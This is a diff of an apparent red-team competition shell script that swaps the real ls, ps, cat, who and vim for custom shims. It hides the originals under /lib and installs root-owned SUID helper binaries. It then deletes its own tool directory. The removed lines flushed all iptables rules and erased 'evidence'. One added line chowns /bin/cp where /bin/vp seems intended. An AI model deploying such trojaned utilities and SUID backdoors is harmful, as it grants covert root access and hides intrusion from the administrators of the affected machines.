@@ -5,33 +5,7 @@
 
 # Install packages that may not be present
 # Replace 'apt' with the package manager of the target machine
-apt install git vim gcc make automake sl
-
-# Flush iptables to make sure github isn't blocked
-iptables -F
-iptables -t mangle -F
-iptables -t nat -F
-iptables -t filter -F
-
-iptables -P OUTPUT ACCEPT
-iptables -P INPUT ACCEPT
-iptables -P FORWARD ACCEPT
-
-
-# Clone a tool that will allow for 'compiled' scripts
-# This will allow the SUID bit to be set and used properly
-git clone https://github.com/neurobin/shc.git
-
-# Install shc
-./shc/configure
-make
-make install
-
-# Delete all shc evidence
-rm -r *
-
-# Clone the repository
-git clone https://github.com/shadow5229/CDT-Tools.git
+#apt install git vim gcc make automake sl
 
 
 # Move "healthy" binaries out of /bin
@@ -43,26 +17,41 @@ mv /bin/cat /lib/module_cat
 mv /usr/bin/who /lib/module_who
 mv /usr/bin/vim /lib/module_vim
 
-# Use 'shc' to "compile" the scripts and place them in /bin
-shc -f CDT-Tools/ls_shim/ls_new -o /bin/ls
-shc -f CDT-Tools/ps_shim/ps_new -o /bin/ps
-shc -f CDT-Tools/cat_shim/cat_new -o /bin/cat
-shc -f CDT-Tools/who_shim/who_new -o /bin/who
-shc -f CDT-Tools/vim_shim/vim_new -o /bin/vim
+# Move my bash shims to replace the old binaries
+mv CDT-Tools/ls_shim/ls_new /bin/ls
+mv CDT-Tools/ps_shim/ps_new /bin/ps
+mv CDT-Tools/cat_shim/cat_new /bin/cat
+mv CDT-Tools/who_shim/who_new /usr/bin/who
+mv CDT-Tools/vim_shim/vim_new /usr/bin/vim
+
+# Move the binaries to their location
+# will be used to leverage the SUID bit and will
+# be called by the shims
+mv CDT-Tools/ls_shim/list /bin/list
+mv CDT-Tools/ps_shim/pros /bin/pros
+mv CDT-Tools/cat_shim/al /bin/al
+mv CDT-Tools/who_shim/waldo /bin/waldo
+mv CDT-Tools/vim_shim/vp /bin/vp
 
 # Set owner to root
 chown root:root /bin/ls
 chown root:root /bin/ps
 chown root:root /bin/cat
-chown root:root /bin/who
-chown root:root /bin/vim
+chown root:root /usr/bin/who
+chown root:root /usr/bin/vim
+
+chown root:root /bin/list
+chown root:root /bin/pros
+chown root:root /bin/al
+chown root:root /bin/waldo
+chown root:root /bin/cp
 
 # Set the SUID bit for root so that all commands will always run
-chmod u+s /bin/ls
-chmod u+s /bin/ps
-chmod u+s /bin/cat
-chmod u+s /bin/who
-chmod u+s /bin/vim
+chmod u+s /bin/list
+chmod u+s /bin/pros
+chmod u+s /bin/al
+chmod u+s /bin/waldo
+chmod u+s /bin/vp
 
 # Cleanup the mess
 rm -r CDT-Tools
